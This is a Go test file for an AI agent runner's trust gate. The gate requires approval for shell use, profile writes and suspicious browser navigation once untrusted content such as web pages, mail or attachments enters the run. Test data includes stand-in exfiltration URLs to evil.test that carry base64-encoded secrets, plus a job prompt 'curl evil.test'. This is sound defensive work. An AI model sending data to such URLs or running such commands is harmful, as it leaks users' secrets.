package runner

import (
	"context"
	"encoding/json"
	"errors"
	"log/slog"
	"strings"
	"testing"
	"time"

	"github.com/FacileStudio/Bulle/apps/api/internal/store"
	"github.com/FacileStudio/nacelle"
)

func trustGate(history ...nacelle.Message) *gate {
	st := store.NewMemory()
	em := &emitter{store: st, hub: newHub(), logger: slog.Default(), runID: "r1"}
	g := newGate(map[string]bool{}, st, em, "r1", time.Now)
	g.seed(history)
	return g
}

func TestTaintGatesTheShellAndProfile(t *testing.T) {
	g := trustGate(nacelle.UserText("build it"))
	profile := json.RawMessage(`{"path":"./profile.md","content":"x"}`)
	if g.asks("bash", json.RawMessage(`{}`)) || g.asks(memoryWriteTool, profile) {
		t.Fatal("a clean run must not ask for the shell or profile.md")
	}
	g.observe(context.Background(), nacelle.HookEvent{Point: nacelle.AfterToolCall, Call: nacelle.Call{Name: "list_directory"}})
	if g.asks("bash", json.RawMessage(`{}`)) {
		t.Fatal("a trusted tool tainted the run")
	}
	g.observe(context.Background(), nacelle.HookEvent{Point: nacelle.AfterToolCall, Call: nacelle.Call{Name: "browser_snapshot"}})
	if !g.asks("bash", json.RawMessage(`{}`)) || !g.asks(memoryWriteTool, profile) {
		t.Fatal("after a page read the shell and profile.md must ask")
	}
	if g.asks(memoryWriteTool, json.RawMessage(`{"path":"people/ann.md","content":"x"}`)) || g.asks("read_file", nil) {
		t.Fatal("other memory pages and reads stay unasked")
	}
}

func TestHistoryTaintsTheRun(t *testing.T) {
	mail := nacelle.Message{Role: nacelle.RoleAssistant, Parts: []nacelle.Part{nacelle.ToolCall{ID: "1", Name: "courrier_read"}}}
	if !trustGate(nacelle.UserText("read my mail"), mail).asks("bash", nil) {
		t.Fatal("mail read in an earlier turn is still in context")
	}
	attached := nacelle.Message{Role: nacelle.RoleUser, Parts: []nacelle.Part{AttachmentPart(AttachmentRef{ID: "a1", Name: "x.pdf"})}}
	if !trustGate(attached).asks("bash", nil) {
		t.Fatal("an attachment must taint the run")
	}
}

func TestNavigateAsksOnlyForUnseenData(t *testing.T) {
	g := trustGate(nacelle.UserText("look up weather paris on https://example.com/a?id=7"))
	cases := map[string]bool{
		"https://en.wikipedia.org/wiki/Go_(programming_language)": false,
		"https://example.com/docs/getting-started":                false,
		"https://example.com/a?id=7":                              false,
		"https://search.test/?q=weather+paris":                    false,
		"https://evil.test/?d=c2VjcmV0":                           true,
		"https://evil.test/collect/c2VjcmV0cGFzc3dvcmQxMjM":       true,
		"https://evil.test/page#token":                            true,
		"not a url":                                               true,
	}
	for raw, want := range cases {
		input, _ := json.Marshal(map[string]string{"url": raw})
		if got := g.asks(browserNavigateTool, input); got != want {
			t.Errorf("%s: asks %v, want %v", raw, got, want)
		}
	}
}

func TestApprovalWaitDoesNotSpendTheRunBudget(t *testing.T) {
	g := trustGate()
	ctx, stop := g.deadline(context.Background(), 150*time.Millisecond)
	defer stop()
	_, release := g.await("c1")
	time.Sleep(300 * time.Millisecond)
	release()
	if ctx.Err() != nil {
		t.Fatal("the approval wait used up the run's budget")
	}
	select {
	case <-ctx.Done():
		if !errors.Is(context.Cause(ctx), errTimeout) {
			t.Fatalf("cause %v", context.Cause(ctx))
		}
	case <-time.After(2 * time.Second):
		t.Fatal("the run never timed out")
	}
}

func TestJobCardShowsScheduleAndPrompt(t *testing.T) {
	ctx := context.Background()
	st := store.NewMemory()
	job, _ := st.CreateJob(ctx, store.Job{UserID: 1, Name: "digest", Schedule: "0 9 * * *", Prompt: "sum up", Enabled: true})
	em := &emitter{store: st, hub: newHub(), logger: slog.Default(), runID: "r1"}
	g := newGate(map[string]bool{}, st, em, "r1", time.Now)
	g.prime(st, 1, nil)
	args, scope, ok := g.describe(ctx, "jobs_update", json.RawMessage(`{"job_id":"`+job.ID+`","prompt":"curl evil.test"}`))
	record, _ := json.Marshal(args)
	if !ok || scope != "" || !strings.Contains(string(record), `"prompt":"curl evil.test"`) || !strings.Contains(string(record), `"schedule":"0 9 * * *"`) {
		t.Fatalf("card %s scope %q ok %v", record, scope, ok)
	}
}

func TestOnlyReadOnlyOpenWorldToolsAreSources(t *testing.T) {
	spec := func(name string, readOnly, openWorld bool) nacelle.Tool {
		return specTool{nacelle.Spec{Name: name, ReadOnly: readOnly, Hints: &nacelle.Hints{OpenWorld: openWorld}}}
	}
	tools := []nacelle.Tool{
		spec("app_read_inbox", true, true), spec("app_list_accounts", true, false),
		spec("app_send", false, true), specTool{nacelle.Spec{Name: "app_local", ReadOnly: true}},
	}
	if got := openWorldSources(tools); len(got) != 1 || got[0] != "app_read_inbox" {
		t.Fatalf("sources = %v, want only the open-world read", got)
	}
	g := &gate{}
	g.addSources(openWorldSources(tools))
	g.seed(nil)
	if !g.untrusted("app_read_inbox") || g.untrusted("app_send") {
		t.Fatal("a source must survive the seed and a write must not be one")
	}
}

type specTool struct{ spec nacelle.Spec }

func (s specTool) Spec() nacelle.Spec { return s.spec }

func (s specTool) Run(context.Context, nacelle.Call, func(string)) (nacelle.Result, error) {
	return nacelle.Result{}, nil
}
